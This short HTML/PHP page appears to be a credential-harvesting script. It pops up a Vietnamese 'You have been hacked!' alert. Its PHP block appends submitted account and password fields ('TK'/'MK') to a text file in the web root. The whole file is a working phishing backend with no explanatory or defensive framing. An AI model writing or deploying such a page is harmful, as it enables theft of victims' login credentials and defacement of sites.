<!DOCTYPE html>
<html>
<body>
<script>
alert('Ban da bi hack!');
</script>
<?php
    $myfile = fopen("/var/www/html/default/info.txt",a);
     fwrite($myfile,"TK: ".$_POST["txtTaiKhoan"]);
     fwrite($myfile,"\n");
     fwrite($myfile,"MK: ".$_POST["txtMatKhau"]);
     fwrite($myfile,"\n");
     fclose($myfile);
?>
</body>
</html>
